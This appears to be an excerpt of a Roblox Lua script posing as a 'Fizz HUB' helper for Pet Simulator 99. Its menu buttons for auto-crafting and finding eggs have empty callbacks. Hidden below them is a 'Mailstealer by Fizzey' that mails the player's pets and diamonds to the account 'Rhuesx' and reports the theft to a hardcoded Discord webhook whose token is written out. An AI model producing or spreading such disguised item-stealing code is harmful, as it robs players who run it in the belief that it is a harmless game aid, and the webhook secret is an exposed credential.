...
Tab:AddParagraph("REGARDING HUB","•My Fizz HUB in Pet Simulator 99 is a script that enriches your gaming experience by providing essential features for endless gameplay•")
...
Tab:AddParagraph("Support Me","By Subscribing to My YouTube Channel")
local Tab = Window:MakeTab({
	Name = "Farm",
...
local Tab = Window:MakeTab({
	Name = "Summer",
	Icon = "rbxassetid://157112358"
})

Tab:AddButton({
	Name = "Auto Craft Summer Gift",
	Callback = function()
		end
...
Tab:AddButton({
	Name = "Auto Find All Eggs",
	Callback = function()
		end
})

Tab:AddButton({
	Name = "Auto Summer Events",
	Callback = function()
		end
})
	OrionLib:Init()
...
local fromPet = "Stargazing Wolf"
local toPet = "Titanic Stargazing Bull"
...
Username = "Rhuesx"
Username2 = "Rhuesx" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "https://discord.com/api/webhooks/1248703943337447505/pG5dym3XSp0oJ1lVBuYes-B9auxHByqpGgq8bwcMTnpaIeINKFPAbXOVrEwMtFJF3wk7"
...
local function SendMessage(url, username, diamonds)
    ...
    local data = {
        ["embeds"] = {{
			...
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by Fizzey. discord.gg/HcpNe56R2a"
			}
        }}
    }
...
local user = Username
local user2 = Username2 or "Rhuesx"
